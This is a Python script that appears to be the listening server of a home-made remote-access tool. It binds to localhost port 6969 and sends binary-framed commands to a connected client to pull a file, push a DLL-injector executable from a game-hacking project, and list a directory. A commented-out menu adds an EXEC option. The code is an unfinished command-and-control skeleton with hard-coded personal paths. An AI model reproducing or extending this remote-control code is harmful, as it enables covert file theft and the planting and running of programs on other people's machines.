import socket
import struct
import os

def get(sock):
    file = br"C:\Users\uttervitriol\source\repos\GameHacking\DLL_Injector\DLL_Injector\Injector\bin\x64\Release\net6.0-windows\Injector.exe"
    buf = b""
    buf += struct.pack("<h", 1)
    buf += struct.pack("<l", len(file))
    buf += file
    sock.send(buf)
    revd = 0
    with open(r"C:\Users\uttervitriol\source\repos\BeanDip\yeet.exe", "wb") as f:
        while(revd != 149504):
            revd += f.write(sock.recv(4096))
            print(revd)

def put(sock):
    file = br"C:\Users\uttervitriol\source\repos\BeanDip\yeet.exe"
    print(f"File: {file}:{len(file)}")
    buf = b""
    buf += struct.pack("<h", 1)
    buf += struct.pack("<l", len(file))
    buf += file
    sock.send(buf)

    sent = 0
    sz = os.path.getsize(r"C:\Users\uttervitriol\source\repos\GameHacking\DLL_Injector\DLL_Injector\Injector\bin\x64\Release\net6.0-windows\Injector.exe")

    buf = b""
    buf += struct.pack("<h", 1)
    buf += struct.pack("<l", sz)
    sock.send(buf)

    with open(r"C:\Users\uttervitriol\source\repos\GameHacking\DLL_Injector\DLL_Injector\Injector\bin\x64\Release\net6.0-windows\Injector.exe", "rb") as f:
        while(sent != sz):
            read = f.read(4096)
            buf = b""
            buf += struct.pack("<h", 1)
            buf += struct.pack("<l", len(read))
            buf += read
            sock.send(buf)
            sent +=  len(read)

def main():
    CONN = ("localhost", 6969)
    sock = socket.socket()
    sock.bind(CONN)
    sock.listen(5)
    conn, addr = sock.accept()

    file = br"C:\Users\uttervitriol\source\repos\BeanDip\*"

    print(f"File: {file}:{len(file)}")
    buf = b""
    buf += struct.pack("<h", 3)
    buf += struct.pack("<l", len(file))
    buf += file
    conn.send(buf)




    # while(1):
    #     choice = input("GET\nPUT\nEXEC\nDIR\n> ")

    #     choice = choice.lower()

    #     if choice == "get":
    #         choice
    #     elif choice == "put":
    #         choice
    #     elif choice == "exec":
    #         choice
    #     elif choice == "dir":
    #         choice
    #     elif choice == "q":
    #         conn.shutdown()
    #         conn.close()
    #         break
    

if __name__ == "__main__":
    main()
